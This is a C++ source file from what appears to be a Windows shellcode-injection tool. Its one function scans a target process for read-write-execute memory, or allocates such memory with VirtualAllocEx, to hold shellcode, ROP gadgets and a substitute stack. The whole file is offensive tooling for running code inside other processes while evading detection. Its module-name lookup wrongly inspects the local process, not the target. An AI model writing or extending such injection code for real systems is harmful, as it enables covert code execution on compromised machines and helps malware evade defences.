#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <vector>
#include <algorithm>
#include <iomanip>

#pragma comment(lib, "psapi.lib")

int FindRWXMemoryRegions(unsigned char* shellcode_base, HANDLE hProcess,
    LPVOID& remoteShellcode, LPVOID& remoteGadgets, LPVOID& remoteStack)
{
    // Note: Requires #include <algorithm> for std::sort

    struct RWXRegion {
        PVOID baseAddress;
        SIZE_T size;
        std::wstring info;
    };

    std::vector<RWXRegion> rwxRegions;
    MEMORY_BASIC_INFORMATION mbi;
    PVOID address = nullptr;

    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        // Check for RWX (PAGE_EXECUTE_READWRITE) regions with size greater than or equal to 0x1000
        if (mbi.State == MEM_COMMIT &&
            mbi.Protect == PAGE_EXECUTE_READWRITE &&
            mbi.RegionSize >= 0x1000) { 

            RWXRegion region;
            region.baseAddress = mbi.BaseAddress;
            region.size = mbi.RegionSize;

            // Try to get module name for this region
            HMODULE hMod;
            WCHAR modName[MAX_PATH] = L"<Unknown>";
            if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                (LPCWSTR)mbi.BaseAddress, &hMod)) {
                GetModuleFileNameW(hMod, modName, MAX_PATH);
            }

            region.info = modName;
            rwxRegions.push_back(region);
        }

        // Move to next region
        address = (PVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
    }

    // Sort regions by size (largest first) to ensure stack gets the largest region
    std::sort(rwxRegions.begin(), rwxRegions.end(),
        [](const RWXRegion& a, const RWXRegion& b) {
            return a.size > b.size;
        });

    if (rwxRegions.empty()) {
        std::wcout << L"[!] No RWX regions found (>=4KB)! Falling back to VirtualAllocEx..." << std::endl;
        remoteShellcode = VirtualAllocEx(hProcess, NULL, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteShellcode) {
            std::wcout << L"[!] VirtualAllocEx failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        std::wcout << L"[+] Allocated shellcode memory at: 0x" << std::hex << remoteShellcode << std::dec << std::endl;

        // Allocate separate region for gadgets
        remoteGadgets = VirtualAllocEx(hProcess, NULL, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteGadgets) {
            std::wcout << L"[!] VirtualAllocEx for gadgets failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        std::wcout << L"[+] Allocated gadgets memory at: 0x" << std::hex << remoteGadgets << std::dec << std::endl;

        // Allocate separate region for clean stack
        remoteStack = VirtualAllocEx(hProcess, NULL, 0x10000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteStack) {
            std::wcout << L"[!] VirtualAllocEx for stack failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        std::wcout << L"[+] Allocated stack memory at: 0x" << std::hex << remoteStack << std::dec << std::endl;
    }
    else if (rwxRegions.size() < 3) {
        std::wcout << L"\n[+] Found only " << rwxRegions.size() << L" RWX region(s) (need 3 for shellcode + gadgets + stack)" << std::endl;
        std::wcout << L"[*] Using found regions and allocating remaining..." << std::endl;
        std::wcout << L"============================================================" << std::endl;

        for (size_t i = 0; i < rwxRegions.size(); ++i) {
            std::wcout << L"[" << i + 1 << L"] Address: 0x" << std::hex << std::setfill(L'0') << std::setw(16)
                << rwxRegions[i].baseAddress << L" | Size: 0x" << rwxRegions[i].size << std::dec
                << L" (" << rwxRegions[i].size << L" bytes)" << std::endl;
            std::wcout << L"    Module: " << rwxRegions[i].info << std::endl;
        }
        std::wcout << L"============================================================" << std::endl;

        // Assign found regions - prioritize stack first, then gadgets, then shellcode
        if (rwxRegions.size() >= 1) {
            remoteStack = rwxRegions[0].baseAddress;
            std::wcout << L"\n[+] Using RWX region for stack at: 0x" << std::hex << remoteStack << std::dec << std::endl;
        }

        if (rwxRegions.size() >= 2) {
            remoteGadgets = rwxRegions[1].baseAddress;
            std::wcout << L"[+] Using RWX region for gadgets at: 0x" << std::hex << remoteGadgets << std::dec << std::endl;
        }

        // Allocate remaining needed regions
        if (rwxRegions.size() < 1) {
            remoteStack = VirtualAllocEx(hProcess, NULL, 0x10000,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteStack) {
                std::wcout << L"[!] VirtualAllocEx for stack failed (Error: " << GetLastError() << L")" << std::endl;
                CloseHandle(hProcess);
                return 1;
            }
            std::wcout << L"[+] Allocated stack memory at: 0x" << std::hex << remoteStack << std::dec << std::endl;
        }

        if (rwxRegions.size() < 2) {
            remoteGadgets = VirtualAllocEx(hProcess, NULL, 0x1000,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteGadgets) {
                std::wcout << L"[!] VirtualAllocEx for gadgets failed (Error: " << GetLastError() << L")" << std::endl;
                CloseHandle(hProcess);
                return 1;
            }
            std::wcout << L"[+] Allocated gadgets memory at: 0x" << std::hex << remoteGadgets << std::dec << std::endl;
        }

        // Always need to allocate shellcode since we have less than 3
        remoteShellcode = VirtualAllocEx(hProcess, NULL, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteShellcode) {
            std::wcout << L"[!] VirtualAllocEx for shellcode failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }
        std::wcout << L"[+] Allocated shellcode memory at: 0x" << std::hex << remoteShellcode << std::dec << std::endl;
    }
    else {
        std::wcout << L"\n[+] Found " << rwxRegions.size() << L" RWX memory region(s) (sorted by size, largest first):" << std::endl;
        std::wcout << L"============================================================" << std::endl;

        for (size_t i = 0; i < rwxRegions.size(); ++i) {
            std::wcout << L"[" << i + 1 << L"] Address: 0x" << std::hex << std::setfill(L'0') << std::setw(16)
                << rwxRegions[i].baseAddress << L" | Size: 0x" << rwxRegions[i].size << std::dec
                << L" (" << rwxRegions[i].size << L" bytes)" << std::endl;
            std::wcout << L"    Module: " << rwxRegions[i].info << std::endl;
        }

        std::wcout << L"============================================================" << std::endl;

        // Select region for shellcode
        std::wcout << L"\n[?] Select region for SHELLCODE (1-" << rwxRegions.size() << L"): ";
        int shellcodeChoice;
        std::cin >> shellcodeChoice;
        std::cin.ignore();

        if (shellcodeChoice < 1 || shellcodeChoice >(int)rwxRegions.size()) {
            std::wcout << L"[!] Invalid choice!" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        remoteShellcode = rwxRegions[shellcodeChoice - 1].baseAddress;
        std::wcout << L"[+] Shellcode region selected: 0x" << std::hex << remoteShellcode << std::dec << std::endl;

        // Select region for gadgets
        std::wcout << L"\n[?] Select region for GADGETS (1-" << rwxRegions.size() << L", different from "
            << shellcodeChoice << L"): ";
        int gadgetsChoice;
        std::cin >> gadgetsChoice;
        std::cin.ignore();

        if (gadgetsChoice < 1 || gadgetsChoice >(int)rwxRegions.size() || gadgetsChoice == shellcodeChoice) {
            std::wcout << L"[!] Invalid choice (must be different from shellcode region)!" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        remoteGadgets = rwxRegions[gadgetsChoice - 1].baseAddress;
        std::wcout << L"[+] Gadgets region selected: 0x" << std::hex << remoteGadgets << std::dec << std::endl;

        // Select region for clean stack
        std::wcout << L"\n[?] Select region for CLEAN STACK [!!!You must choose a region with size >= 0x4000 (16kb) !!!] (1-" << rwxRegions.size() << L", different from "
            << shellcodeChoice << L" and " << gadgetsChoice << L"): ";
        int stackChoice;
        std::cin >> stackChoice;
        std::cin.ignore();

        if (stackChoice < 1 || stackChoice >(int)rwxRegions.size() ||
            stackChoice == shellcodeChoice || stackChoice == gadgetsChoice) {
            std::wcout << L"[!] Invalid choice (must be different from shellcode and gadgets regions)!" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        remoteStack = rwxRegions[stackChoice - 1].baseAddress;
        std::wcout << L"[+] Stack region selected: 0x" << std::hex << remoteStack << std::dec << std::endl;

        std::wcout << L"\n[*] Memory allocation summary:" << std::endl;
        std::wcout << L"    Shellcode: 0x" << std::hex << remoteShellcode << std::dec << std::endl;
        std::wcout << L"    Gadgets:   0x" << std::hex << remoteGadgets << std::dec << std::endl;
        std::wcout << L"    Stack:     0x" << std::hex << remoteStack << std::dec << std::endl;
    }

    return 0;
}